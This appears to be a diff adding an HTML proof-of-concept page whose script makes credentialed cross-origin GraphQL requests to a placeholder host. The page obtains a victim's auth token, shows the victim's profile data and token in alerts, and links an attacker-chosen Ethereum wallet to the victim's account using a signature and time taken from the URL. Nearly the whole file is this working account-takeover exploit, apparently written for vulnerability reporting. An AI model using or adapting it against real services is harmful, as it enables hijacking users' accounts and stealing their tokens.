@@ -1,0 +1,60 @@
+<!--
+
+
+
+-->
+
+<script>
+
+var req1 = new XMLHttpRequest();
+req1.onload = reqListener;
+req1.open('POST','http://127.0.0.1',true);
+req1.setRequestHeader('Content-Type', 'application/json');
+
+var data = JSON.stringify({"operationName":"RequestAuthToken","variables":{"input":{"scope":"CONNECT_WALLET_AUTH"}},"query":"mutation RequestAuthToken($input: RequestAuthTokenInput!) {\n  requestAuthToken(input: $input) {\n    account {\n      ...AccountInfo\n      __typename\n    }\n    errors {\n      ...UserErrorFragment\n      __typename\n    }\n    token\n    __typename\n  }\n}\n\nfragment AccountInfo on Account {\n  id\n  accountProfile {\n    ...AccountProfileInfo\n    __typename\n  }\n  __typename\n}\n\nfragment AccountProfileInfo on AccountProfile {\n  id\n  username\n  name\n  email\n  avatarUrl\n  telegram\n  twitter\n  websiteUrl\n  __typename\n}\n\nfragment UserErrorFragment on UserError {\n  __typename\n  message\n}"});
+req1.withCredentials = true;
+req1.send(data);
+setTimeout(function(){reqListener()},3000);
+
+function reqListener() {
+   data1 = JSON.parse(this.responseText);
+   alert(JSON.stringify(data1.data));
+   
+   j =JSON.stringify(data1["data"]["requestAuthToken"]["token"]);
+   jwt  = j.substring(1, j.length-1);
+   alert("this is the jwt"+jwt);
+
+   var req = new XMLHttpRequest();
+   req.open('POST','http://127.0.0.1',true);
+   req.setRequestHeader('Content-Type', 'application/json');
+   var data1 = JSON.stringify({"operationName":"ConnectAuthMethod","variables":{"input":{"credentials":{"wallet":{"address":"0xa270bb1241FF428927406e5Fde47e7EA8592aFb1"}},"method":"WALLET","token":jwt}},"query":"mutation ConnectAuthMethod($input: ConnectAuthMethodInput!) {\n  connectAuthMethod(input: $input) {\n    name\n    email\n    verified\n    token\n    address\n    errors {\n      ...UserErrorFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment UserErrorFragment on UserError {\n  __typename\n  message\n}"});
+  req.withCredentials = true;
+  req.send(data1);var url_string = window.location.href;
+var url = new URL(url_string);
+var signature = url.searchParams.get("signature");
+var time = url.searchParams.get("time");
+
+
+setTimeout(function(){submit()},6000);
+ function submit() { 
+ 	var req2 = new XMLHttpRequest();
+ 	req2.onload = reqlistener1;
+req2.open('POST','http://127.0.0.1',true);
+req2.setRequestHeader('Content-Type', 'application/json');
+
+var datas = JSON.stringify({"operationName":"ConnectAuthMethodComplete","variables":{"input":{"credentials":{"wallet":{"network":"ethereum","signature":signature,"timestamp":time,"token":jwt}},"method":"WALLET"}},"query":"mutation ConnectAuthMethodComplete($input: ConnectAuthMethodCompleteInput!) {\n  connectAuthMethodComplete(input: $input) {\n    account {\n      ...AccountInfo\n      __typename\n    }\n    errors {\n      ...UserErrorFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment AccountInfo on Account {\n  id\n  accountProfile {\n    ...AccountProfileInfo\n    __typename\n  }\n  __typename\n}\n\nfragment AccountProfileInfo on AccountProfile {\n  id\n  username\n  name\n  email\n  avatarUrl\n  telegram\n  twitter\n  websiteUrl\n  __typename\n}\n\nfragment UserErrorFragment on UserError {\n  __typename\n  message\n}"});
+req2.withCredentials = true;
+req2.send(datas);
+
+function reqlistener1() {
+	alert(this.response);
+}
+}
+
+};
+
+
+
+
+ 
+</script>
